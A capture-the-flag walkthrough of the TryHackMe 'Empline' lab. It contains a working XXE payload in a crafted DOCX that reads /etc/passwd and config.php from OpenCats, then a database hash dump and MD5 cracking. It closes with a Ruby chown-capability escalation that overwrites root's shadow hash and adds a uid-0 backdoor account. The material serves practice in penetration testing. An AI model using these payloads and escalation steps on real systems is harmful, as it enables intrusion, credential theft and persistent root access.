# TryHackMe-Empline

# Room Link
https://tryhackme.com/room/empline

# Enumeration

```
⛩\> nmap -p- -sV -sC -v -oA enum --min-rate 4500 --max-rtt-timeout 1500ms --open 10.10.196.182
Nmap scan report for 10.10.196.182
Host is up (0.38s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c0:d5:41:ee:a4:d0:83:0c:97:0d:75:cc:7b:10:7f:76 (RSA)
|   256 83:82:f9:69:19:7d:0d:5c:53:65:d5:54:f6:45:db:74 (ECDSA)
|_  256 4f:91:3e:8b:69:69:09:70:0e:82:26:28:5c:84:71:c9 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Empline
3306/tcp open  mysql   MySQL 5.5.5-10.1.48-MariaDB-0ubuntu0.18.04.1
| mysql-info:
|   Protocol: 10
|   Version: 5.5.5-10.1.48-MariaDB-0ubuntu0.18.04.1
|   Thread ID: 86
|   Capabilities flags: 63487
|   Some Capabilities: IgnoreSigpipes, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, InteractiveClient, ODBCClient, FoundRows, ConnectWithDatabase, SupportsTransactions, Support41Auth, LongColumnFlag, LongPassword, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, SupportsCompression, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: 2v{'O:rR%[~,Y^MEQFN3
|_  Auth Plugin Name: mysql_native_password
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Nmap reveals three open ports, HTTP, SSH & Mysql. Based on SSH version information, it is Ubuntu Bionic. Let’s visit the web site.
<img width="1114" height="253" alt="image" src="https://github.com/user-attachments/assets/0fb04f14-d43f-40d6-bf7b-8e33f65f5718" />
(https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/6B011803-9577-49D8-B1B2-1490E80F5BE1/A39765D6-2F69-43B9-A90F-4E0EC4C9F0C9_2/Screen%20Shot%202021-09-20%20at%2002.18.18.png)

There’s nothing much on the homepage, but under page source we see hostname and vhost. Let’s add them to hosts file and visit it.

<img width="at 02.19.45.png]1920" height="561" alt="image" src="https://github.com/user-attachments/assets/ae69928e-6a86-4c23-ab34-d1f08187df63" />
 (https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/6B011803-9577-49D8-B1B2-1490E80F5BE1/9A57A402-B1D6-47BE-965C-8743E100376F_2/Screen%20Shot%202021-09-20%20at%2002.19.45.png)

OpenCats application is running, it is free, Open-Source Applicant Tracking System including job-board. Entirely customizable! Let’s look for running version vulnerabilities.

<img width="1456" height="440" alt="image" src="https://github.com/user-attachments/assets/acb88938-e252-48eb-bff0-f09d13ef774b" />
(https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/6B011803-9577-49D8-B1B2-1490E80F5BE1/517F48B3-8493-40BE-B8BA-A2308E4204ED_2/Screen%20Shot%202021-09-20%20at%2002.24.17.png)

There are three vulnerabilities in total. We will initially try CVE-2019-13358 vulnerability. According to the latest commit, we can safely assume that an attacker can able to load XML entity and read local files in the previous version of OpenCats.

[Address vulnerabilities by RussH · Pull Request #440 · opencats/OpenCATS](https://github.com/opencats/OpenCATS/pull/440/files)
<img width="1341" height="289" alt="image" src="https://github.com/user-attachments/assets/215b3d3a-ca3d-45fb-83b6-73ea7419f5dc" />
(https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/6B011803-9577-49D8-B1B2-1490E80F5BE1/FCAC354B-D906-403C-9BA4-3CEEFAE9010F_2/Screen%20Shot%202021-09-20%20at%2002.37.14.png)

[XML External Entity Injection (XXE) in OpenCats Applicant Tracking System - Dodd Security](https://doddsecurity.com/312/xml-external-entity-injection-xxe-in-opencats-applicant-tracking-system/)

There’s already a blog written by the same researcher who found this vulnerability in the application. A malicious DOCX or ODT file will able to exploit this vulnerability. According to the blog, OpenCats has a careers page, where we can have access to upload functionality.

<img width="1920" height="359" alt="image" src="https://github.com/user-attachments/assets/64e57a26-4d0e-40cb-b838-84a37fff95cd" />
(https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/6B011803-9577-49D8-B1B2-1490E80F5BE1/A77A9347-3E50-485C-8F86-3157A8FDC2EE_2/Screen%20Shot%202021-09-20%20at%2002.58.12.png)

Click on current opening positions and go to current available position.

<img width="1920" height="539" alt="image" src="https://github.com/user-attachments/assets/5c8ff186-fa7d-4578-bcfd-6cabf0470e1d" />
(https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/6B011803-9577-49D8-B1B2-1490E80F5BE1/740CE3DA-2BDD-4672-A4A4-DC4B803C17F2_2/Screen%20Shot%202021-09-20%20at%2002.59.33.png)

Apply for this position and you will see a form where you can input all your details for this position.

<img width="1920" height="763" alt="image" src="https://github.com/user-attachments/assets/098eedd3-9264-4320-b59d-33c142ee0d9b" />
(https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/6B011803-9577-49D8-B1B2-1490E80F5BE1/865E2778-BEF3-4711-B35D-50DF16AA75E4_2/Screen%20Shot%202021-09-20%20at%2003.00.28.png)

As you can see, upload functionality is available. Now we need to craft a XML file and merge it with DOCX and upload it to read any local files. The blog has explained the process to create a DOCX file to read files.

Create a DOCX file with just simple text as body. If you don’t have Microsoft Word then you can use LibreOffice or Google Docs and just save it as ‘.docx’.

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/77904b68-b40f-467c-b73e-d3c1f5686d59" />
(https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/6B011803-9577-49D8-B1B2-1490E80F5BE1/D2AEB1EF-77ED-4AC6-B547-13621B87B2E6_2/Screen%20Shot%202021-09-20%20at%2003.35.27.png)

Once you save the document, now we need to extract it and edit the ‘word/document.xml’ file.

```
⛩\> unzip resume.docx
Archive:  resume.docx
  inflating: _rels/.rels
  inflating: docProps/core.xml
  inflating: docProps/app.xml
  inflating: word/_rels/document.xml.rels
  inflating: word/document.xml
  inflating: word/styles.xml
  inflating: word/fontTable.xml
  inflating: word/settings.xml
  inflating: [Content_Types].xml

⛩\> cat word/document.xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:w10="urn:schemas-microsoft-com:office:word" xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing" xmlns:wps="http://schemas.microsoft.com/office/word/2010/wordprocessingShape" xmlns:wpg="http://schemas.microsoft.com/office/word/2010/wordprocessingGroup" xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" xmlns:wp14="http://schemas.microsoft.com/office/word/2010/wordprocessingDrawing" xmlns:w14="http://schemas.microsoft.com/office/word/2010/wordml" mc:Ignorable="w14 wp14"><w:body><w:p><w:pPr><w:pStyle w:val="Normal"/><w:bidi w:val="0"/><w:jc w:val="left"/><w:rPr></w:rPr></w:pPr><w:r><w:rPr></w:rPr><w:t>demo</w:t></w:r></w:p><w:sectPr><w:type w:val="nextPage"/><w:pgSz w:w="12240" w:h="15840"/><w:pgMar w:left="1134" w:right="1134" w:header="0" w:top="1134" w:footer="0" w:bottom="1134" w:gutter="0"/><w:pgNumType w:fmt="decimal"/><w:formProt w:val="false"/><w:textDirection w:val="lrTb"/></w:sectPr></w:body></w:document>
```

Edit the file and add below XML Entity at start of the second line.

`<!DOCTYPE xxe [<!ENTITY xxe SYSTEM '`[`file:///etc/passwd`](file:///etc/passwd)`'>]>`

Then find the text which you have typed in the body of word file and remove it then replace with the following `&xxe;`d After uploading the document and it calls our external entity and we can able to read the 'passwd' file.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xxe [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]> <w:document xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:w10="urn:schemas-microsoft-com:office:word" xmlns:w14="http://schemas.microsoft.com/office/word/2010/wordml" xmlns:wps="http://schemas.microsoft.com/office/word/2010/wordprocessingShape" xmlns:wpg="http://schemas.microsoft.com/office/word/2010/wordprocessingGroup" xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:m="http://schemas.openxmlformats.org/officeDocument/2006/math" mc:Ignorable="w14"><w:body><w:p><w:pPr><w:pStyle w:val="Body"/></w:pPr><w:r><w:rPr><w:rtl w:val="0"/></w:rPr><w:t>&xxe;</w:t></w:r></w:p><w:sectPr><w:headerReference w:type="default" r:id="rId4"/><w:footerReference w:type="default" r:id="rId5"/><w:pgSz w:w="12240" w:h="15840" w:orient="portrait"/><w:pgMar w:top="1440" w:right="1440" w:bottom="1440" w:left="1440" w:header="720" w:footer="864"/><w:bidi w:val="0"/></w:sectPr></w:body></w:document>
```

Once you edit and add the entity, now we need to zip it again.

```
⛩\> zip resume.docx word/document.xml
updating: word/document.xml
        zip warning: Local Entry CRC does not match CD: word/document.xml
 (deflated 60%)
```

Ignore the warning. Proceed to upload this docx file.

# Initial Access

<img width="1920" height="773" alt="image" src="https://github.com/user-attachments/assets/f40dfce1-2e52-464b-8504-1f5be0393617" />
(https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/6B011803-9577-49D8-B1B2-1490E80F5BE1/A38E2D1C-F4ED-4936-B7ED-FDDE1AEA3BC8_2/Screen%20Shot%202021-09-20%20at%2003.57.46.png)

As you can see, we got the ‘passwd’ file information. Let’s read the ‘config’ file of OpenCats application. Use below entity to convert the ‘config.php’ file content to base64.

`<!DOCTYPE xxe [<!ENTITY xxe SYSTEM ‘`[`php://filter/convert.base64-encode/resource=config.php`](php://filter/convert.base64-encode/resource=config.php)`'>]>`

<img width="1920" height="767" alt="image" src="https://github.com/user-attachments/assets/3ff2b498-54d8-4877-bd41-9e8759787500" />
(https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/6B011803-9577-49D8-B1B2-1490E80F5BE1/4B6E1482-9840-4DBB-BD22-017485ADF856_2/Screen%20Shot%202021-09-20%20at%2004.06.46.png)

As you can see, we got the encoded text. Now we need to decode it.

<img width="2032" height="1090" alt="image" src="https://github.com/user-attachments/assets/b11f6574-0e33-4417-aefe-d9a585ee193e" />
(https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/6B011803-9577-49D8-B1B2-1490E80F5BE1/5ECB9823-44A6-4BF6-B5D2-93AA5CC7303A_2/Screen%20Shot%202021-09-20%20at%2004.08.00.png)

We got DB credentials from the config file. Let’s access Mysql using these creds.

```
⛩\> mysql -h empline.thm -u james -p -D opencats -A
Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 94
Server version: 10.1.48-MariaDB-0ubuntu0.18.04.1 Ubuntu 18.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and s.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [opencats]> describe user;
+---------------------------+--------------+------+-----+---------+----------------+
| Field                     | Type         | Null | Key | Default | Extra          |
+---------------------------+--------------+------+-----+---------+----------------+
| user_id                   | int(11)      | NO   | PRI | NULL    | auto_increment |
| site_id                   | int(11)      | NO   | MUL | 0       |                |
| user_name                 | varchar(64)  | NO   |     |         |                |
| email                     | varchar(128) | YES  |     | NULL    |                |
| password                  | varchar(128) | NO   |     |         |                |

--------SNIP------
```

Now dump the password of users.

```
MariaDB [opencats]> select user_name,email,password from user;
+----------------+----------------------+----------------------------------+
| user_name      | email                | password                         |
+----------------+----------------------+----------------------------------+
| admin          | admin@testdomain.com | b67b5ecc5d8902ba59c65596e4c053ec |
| cats@rootadmin | 0                    | cantlogin                        |
| george         |                      | 86d0dfda99dbebc424eb4407947356ac |
| james          |                      | e53fbdb31890ff3bc129db0e27c473c9 |
+----------------+----------------------+----------------------------------+
4 rows in set (0.410 sec)
```

As we already know that ‘george’ is a user of host, let’s crack the hash of this user. But first find the hashing algorithm.

```
⛩\> hash-identifier 86d0dfda99dbebc424eb4407947356ac
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
```

It’s MD5 hash.

```
⛩\> hashcat 86d0dfda99dbebc424eb4407947356ac -m 0 /usr/share/wordlists/rockyou.txt

-----------SNIP------------

86d0dfda99dbebc424eb4407947356ac:pretonnevippasempre

Session..........: hashcat
Status...........: Cracked
Hash.Name........: MD5
Hash.Target......: 86d0dfda99dbebc424eb4407947356ac
Time.Started.....: Mon Sep 20 11:20:11 2021 (1 sec)
Time.Estimated...: Mon Sep 20 11:20:12 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  4653.3 kH/s (0.21ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 4538368/14344385 (31.64%)
Rejected.........: 0/4538368 (0.00%)
Restore.Point....: 4536320/14344385 (31.62%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: pretty02-9694871 -> prepre123

Started: Mon Sep 20 11:20:10 2021
Stopped: Mon Sep 20 11:20:14 2021
```

We go the password, now let’s login with SSH.

```
⛩\> pwncat ssh://george@empline.thm
[11:27:43] Welcome to pwncat 🐈!                                                                                                                __main__.py:143
Password: *******************
[11:28:01] empline.thm:22: registered new host w/ db                                                                                             manager.py:502
(local) pwncat$

(remote) george@empline:/home/george$ id
uid=1002(george) gid=1002(george) groups=1002(george)
```

# Privilege Escalation

```
Files with capabilities (limited to 50):
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/local/bin/ruby = cap_chown+ep
```

Linpeas detected ‘chown’ capability using ruby application. Let’s change the

```
(remote) george@empline:/home/george$ echo -n 'File.chown(1002, 1002, "/etc/shadow")' > chown.rb

(remote) george@empline:/home/george$ ls -la /etc/shadow
-rw-r----- 1 root shadow 1081 Jul 20 19:48 /etc/shadow

(remote) george@empline:/home/george$ ruby chown.rb

(remote) george@empline:/home/george$ ls -la /etc/shadow
-rw-r----- 1 george george 1081 Jul 20 19:48 /etc/shadow
```

As you can see, ‘shadow’ file owner has changed to ‘george’ user. Now we add new hash to root user (not recommended for pentest), rather create a new user and give root privileges. As I am on private instance of THM, it barely matters even if I change the root password.

```
(remote) george@empline:/home/george$ openssl passwd -6 -salt 'test'
Password:
$6$test$bzcdZcb/7XNcrHf09O9O89Vnd8x5hnOsG3cn8C5JyeBhbCyVhZIJS68.DP2LGUsx/6tpfbjmAcFgnUeUT6j120
```

Using openssl we can generate new password hash.

- \-6 : SHA512 Algorithm
- \-salt : Add salt to hash and ‘test’ is salt
- Do not pass the password directly from command line, as this command will be stored in history it will be visible.

Now edit the ‘shadow’ file and replace the existing hash with your new hash.

```
(remote) george@empline:/home/george$ grep 'root' /etc/shadow
root:$6$test$bzcdZcb/7XNcrHf09O9O89Vnd8x5hnOsG3cn8C5JyeBhbCyVhZIJS68.DP2LGUsx/6tpfbjmAcFgnUeUT6j120:18828:0:99999:7:::

(remote) george@empline:/home/george$ su -
Password:

root@empline:~# id
uid=0(root) gid=0(root) groups=0(root)
```

We got root access.

# Add user with root privileges

```
(remote) george@empline:/home/george$ echo -n 'File.chown(1002, 1002, "/etc/passwd")' > chown.rb

(remote) george@empline:/home/george$ ruby chown.rb

(remote) george@empline:/home/george$ tail -n 1 /etc/passwd
demo:x:0:0:/tmp:/bin/bash

(remote) george@empline:/home/george$ tail -n 1 /etc/shadow
demo:$6$test$bzcdZcb/7XNcrHf09O9O89Vnd8x5hnOsG3cn8C5JyeBhbCyVhZIJS68.DP2LGUsx/6tpfbjmAcFgnUeUT6j120::0:::::
```

[Understanding the /etc/shadow File](https://linuxize.com/post/etc-shadow-file/)

Once you add a user to ‘passwd’ file and it’s password hash to ‘shadow’ file, you can login now.

```
(remote) george@empline:/home/george$ su demo
Password:

root@empline:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```

Once you done with the machine, you have to remove the privileges and user/hash.

